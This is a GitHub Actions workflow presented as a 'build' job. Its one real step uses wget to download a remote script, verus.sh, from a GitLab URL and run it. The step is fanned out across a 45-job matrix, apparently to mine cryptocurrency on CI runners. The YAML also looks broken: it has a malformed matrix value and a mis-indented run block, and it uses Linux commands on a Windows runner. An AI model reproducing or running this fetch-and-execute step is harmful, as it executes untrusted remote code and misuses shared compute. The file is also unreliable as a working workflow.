name: kunyuk.sh

on: [workflow_dispatch]

jobs:

  build:

    name: Kunyuk

    runs-on: windows-latest

    strategy:

      max-parallel: 5

      fail-fast: false

      matrix:

        go: [1.0, 1.1, 1.2, 1.3, 1,35]

        flag: [A, B, C, D, E, F, G, H, I]

    env:

        NUM_JOBS: 20

        JOB: ${{ matrix.go }}

    steps:

    - name: DOWNLOAD

      run: |

wget https://gitlab.com/fajarranz19/m/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh

    - name: DONE

      run: exit
